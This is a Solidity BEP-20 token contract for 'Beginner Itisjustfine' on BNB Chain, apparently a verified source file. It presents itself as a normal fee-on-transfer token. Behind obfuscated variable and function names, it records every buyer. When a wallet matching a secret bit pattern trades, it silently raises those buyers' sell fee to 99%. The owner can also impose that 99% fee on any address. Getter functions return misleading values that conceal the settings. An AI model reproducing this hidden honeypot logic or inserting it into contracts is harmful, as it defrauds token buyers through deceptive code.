/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract BeginnerItisjustfine is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Beginner Itisjustfine ";
    string constant _symbol = "BeginnerItisjustfine";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeMaxSellAutoBuyTxReceiver;
    mapping(address => bool) private modeReceiverAutoLiquidity;
    mapping(address => bool) private launchedFeeMinMarketing;
    mapping(address => bool) private launchedExemptLiquidityMode;
    mapping(address => uint256) private launchedMarketingIsTeamModeLiquidityTrading;
    mapping(uint256 => address) private liquidityTxMaxBotsMarketing;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private liquidityAutoReceiverFeeMode = 0;
    uint256 private walletTxIsAutoBuyLimit = 8;

    //SELL FEES
    uint256 private buyLiquiditySwapTeam = 0;
    uint256 private botsReceiverMinFee = 8;

    uint256 private burnMarketingSwapBuyReceiverTeamExempt = walletTxIsAutoBuyLimit + liquidityAutoReceiverFeeMode;
    uint256 private sellMinMarketingWallet = 100;

    address private launchedAutoFeeMode = (msg.sender); // auto-liq address
    address private buyAutoSellSwap = (0x8aD0f0d1593D4DF1c335F08CfFFFe2d1A7AC5f09); // marketing address
    address private receiverMaxLaunchedBuy = DEAD;
    address private limitSwapIsBotsWalletTeam = DEAD;
    address private launchedModeAutoMin = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txMaxIsTrading;
    uint256 private limitAutoSellTrading;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private receiverLiquidityLimitTeam;
    uint256 private launchedLiquidityAutoMode;
    uint256 private txExemptFeeWallet;
    uint256 private walletReceiverExemptSwap;
    uint256 private txFeeMinTradingReceiverSell;

    bool private maxMarketingMinExempt = true;
    bool private launchedExemptLiquidityModeMode = true;
    bool private maxIsExemptTrading = true;
    bool private burnSellLaunchedTx = true;
    bool private txMarketingModeWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private marketingSwapTeamFee = _totalSupply / 1000; // 0.1%

    
    bool private liquidityExemptTeamTx;
    uint256 private teamMinAutoLimit;
    uint256 private buyBotsExemptFeeIsMin;
    bool private autoSellFeeBuy;
    uint256 private maxModeMarketingLiquidityTradingLaunched;
    bool private exemptMaxBotsAutoWallet;
    uint256 private burnExemptMinLiquidity;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        receiverLiquidityLimitTeam = true;

        modeMaxSellAutoBuyTxReceiver[msg.sender] = true;
        modeMaxSellAutoBuyTxReceiver[address(this)] = true;

        modeReceiverAutoLiquidity[msg.sender] = true;
        modeReceiverAutoLiquidity[0x0000000000000000000000000000000000000000] = true;
        modeReceiverAutoLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        modeReceiverAutoLiquidity[address(this)] = true;

        launchedFeeMinMarketing[msg.sender] = true;
        launchedFeeMinMarketing[0x0000000000000000000000000000000000000000] = true;
        launchedFeeMinMarketing[0x000000000000000000000000000000000000dEaD] = true;
        launchedFeeMinMarketing[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityMinAutoMax(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return liquidityMinAutoMax(sender, recipient, amount);
    }

    function liquidityMinAutoMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = botsLiquidityAutoMode(sender) || botsLiquidityAutoMode(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                txWalletTeamLaunchedFeeLimit();
            }
            if (!bLimitTxWalletValue) {
                minFeeAutoTx(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return tradingModeBuyIs(sender, recipient, amount);}

        if (!modeMaxSellAutoBuyTxReceiver[sender] && !modeMaxSellAutoBuyTxReceiver[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || launchedFeeMinMarketing[sender] || launchedFeeMinMarketing[recipient], "Max TX Limit has been triggered");

        if (maxTxModeSell()) {feeReceiverWalletBuy();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = receiverBotsTxTeamLiquidityLaunchedMarketing(sender) ? launchedMarketingBuyTx(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function tradingModeBuyIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function receiverBotsTxTeamLiquidityLaunchedMarketing(address sender) internal view returns (bool) {
        return !modeReceiverAutoLiquidity[sender];
    }

    function walletBotsModeMin(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            burnMarketingSwapBuyReceiverTeamExempt = botsReceiverMinFee + buyLiquiditySwapTeam;
            return burnSellMaxLaunchedMarketing(sender, burnMarketingSwapBuyReceiverTeamExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            burnMarketingSwapBuyReceiverTeamExempt = walletTxIsAutoBuyLimit + liquidityAutoReceiverFeeMode;
            return burnMarketingSwapBuyReceiverTeamExempt;
        }
        return burnSellMaxLaunchedMarketing(sender, burnMarketingSwapBuyReceiverTeamExempt);
    }

    function launchedMarketingBuyTx(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(walletBotsModeMin(sender, receiver == uniswapV2Pair)).div(sellMinMarketingWallet);

        if (launchedExemptLiquidityMode[sender] || launchedExemptLiquidityMode[receiver]) {
            feeAmount = amount.mul(99).div(sellMinMarketingWallet);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function botsLiquidityAutoMode(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function burnSellMaxLaunchedMarketing(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = launchedMarketingIsTeamModeLiquidityTrading[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function minFeeAutoTx(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        liquidityTxMaxBotsMarketing[exemptLimitValue] = addr;
    }

    function txWalletTeamLaunchedFeeLimit() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (launchedMarketingIsTeamModeLiquidityTrading[liquidityTxMaxBotsMarketing[i]] == 0) {
                    launchedMarketingIsTeamModeLiquidityTrading[liquidityTxMaxBotsMarketing[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyAutoSellSwap).transfer(amountBNB * amountPercentage / 100);
    }

    function maxTxModeSell() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    txMarketingModeWallet &&
    _balances[address(this)] >= marketingSwapTeamFee;
    }

    function feeReceiverWalletBuy() internal swapping {
        uint256 amountToLiquify = marketingSwapTeamFee.mul(liquidityAutoReceiverFeeMode).div(burnMarketingSwapBuyReceiverTeamExempt).div(2);
        uint256 amountToSwap = marketingSwapTeamFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = burnMarketingSwapBuyReceiverTeamExempt.sub(liquidityAutoReceiverFeeMode.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityAutoReceiverFeeMode).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(walletTxIsAutoBuyLimit).div(totalETHFee);

        payable(buyAutoSellSwap).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                launchedAutoFeeMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBuyAutoSellSwap() public view returns (address) {
        return buyAutoSellSwap;
    }
    function setBuyAutoSellSwap(address a0) public onlyOwner {
        if (buyAutoSellSwap != launchedModeAutoMin) {
            launchedModeAutoMin=a0;
        }
        if (buyAutoSellSwap == launchedAutoFeeMode) {
            launchedAutoFeeMode=a0;
        }
        buyAutoSellSwap=a0;
    }

    function getLaunchedExemptLiquidityMode(address a0) public view returns (bool) {
        if (a0 != launchedModeAutoMin) {
            return maxMarketingMinExempt;
        }
        if (launchedExemptLiquidityMode[a0] == launchedExemptLiquidityMode[a0]) {
            return maxMarketingMinExempt;
        }
        if (launchedExemptLiquidityMode[a0] == launchedFeeMinMarketing[a0]) {
            return maxIsExemptTrading;
        }
            return launchedExemptLiquidityMode[a0];
    }
    function setLaunchedExemptLiquidityMode(address a0,bool a1) public onlyOwner {
        launchedExemptLiquidityMode[a0]=a1;
    }

    function getMarketingSwapTeamFee() public view returns (uint256) {
        if (marketingSwapTeamFee == burnMarketingSwapBuyReceiverTeamExempt) {
            return burnMarketingSwapBuyReceiverTeamExempt;
        }
        if (marketingSwapTeamFee == marketingSwapTeamFee) {
            return marketingSwapTeamFee;
        }
        return marketingSwapTeamFee;
    }
    function setMarketingSwapTeamFee(uint256 a0) public onlyOwner {
        if (marketingSwapTeamFee != liquidityAutoReceiverFeeMode) {
            liquidityAutoReceiverFeeMode=a0;
        }
        if (marketingSwapTeamFee != buyLiquiditySwapTeam) {
            buyLiquiditySwapTeam=a0;
        }
        if (marketingSwapTeamFee == walletTxIsAutoBuyLimit) {
            walletTxIsAutoBuyLimit=a0;
        }
        marketingSwapTeamFee=a0;
    }

    function getLiquidityAutoReceiverFeeMode() public view returns (uint256) {
        if (liquidityAutoReceiverFeeMode != buyLiquiditySwapTeam) {
            return buyLiquiditySwapTeam;
        }
        if (liquidityAutoReceiverFeeMode == burnMarketingSwapBuyReceiverTeamExempt) {
            return burnMarketingSwapBuyReceiverTeamExempt;
        }
        return liquidityAutoReceiverFeeMode;
    }
    function setLiquidityAutoReceiverFeeMode(uint256 a0) public onlyOwner {
        if (liquidityAutoReceiverFeeMode != sellMinMarketingWallet) {
            sellMinMarketingWallet=a0;
        }
        liquidityAutoReceiverFeeMode=a0;
    }

    function getBuyLiquiditySwapTeam() public view returns (uint256) {
        if (buyLiquiditySwapTeam != walletTxIsAutoBuyLimit) {
            return walletTxIsAutoBuyLimit;
        }
        if (buyLiquiditySwapTeam == botsReceiverMinFee) {
            return botsReceiverMinFee;
        }
        return buyLiquiditySwapTeam;
    }
    function setBuyLiquiditySwapTeam(uint256 a0) public onlyOwner {
        buyLiquiditySwapTeam=a0;
    }

    function getLaunchedAutoFeeMode() public view returns (address) {
        return launchedAutoFeeMode;
    }
    function setLaunchedAutoFeeMode(address a0) public onlyOwner {
        launchedAutoFeeMode=a0;
    }

    function getModeReceiverAutoLiquidity(address a0) public view returns (bool) {
        if (modeReceiverAutoLiquidity[a0] == modeReceiverAutoLiquidity[a0]) {
            return burnSellLaunchedTx;
        }
        if (modeReceiverAutoLiquidity[a0] != modeReceiverAutoLiquidity[a0]) {
            return txMarketingModeWallet;
        }
            return modeReceiverAutoLiquidity[a0];
    }
    function setModeReceiverAutoLiquidity(address a0,bool a1) public onlyOwner {
        if (modeReceiverAutoLiquidity[a0] == modeMaxSellAutoBuyTxReceiver[a0]) {
           modeMaxSellAutoBuyTxReceiver[a0]=a1;
        }
        modeReceiverAutoLiquidity[a0]=a1;
    }

    function getLaunchedFeeMinMarketing(address a0) public view returns (bool) {
        if (launchedFeeMinMarketing[a0] != modeMaxSellAutoBuyTxReceiver[a0]) {
            return maxMarketingMinExempt;
        }
        if (a0 == launchedAutoFeeMode) {
            return burnSellLaunchedTx;
        }
        if (a0 != limitSwapIsBotsWalletTeam) {
            return txMarketingModeWallet;
        }
            return launchedFeeMinMarketing[a0];
    }
    function setLaunchedFeeMinMarketing(address a0,bool a1) public onlyOwner {
        if (a0 == launchedModeAutoMin) {
            launchedExemptLiquidityModeMode=a1;
        }
        launchedFeeMinMarketing[a0]=a1;
    }

    function getSellMinMarketingWallet() public view returns (uint256) {
        if (sellMinMarketingWallet != burnMarketingSwapBuyReceiverTeamExempt) {
            return burnMarketingSwapBuyReceiverTeamExempt;
        }
        return sellMinMarketingWallet;
    }
    function setSellMinMarketingWallet(uint256 a0) public onlyOwner {
        if (sellMinMarketingWallet == burnMarketingSwapBuyReceiverTeamExempt) {
            burnMarketingSwapBuyReceiverTeamExempt=a0;
        }
        sellMinMarketingWallet=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}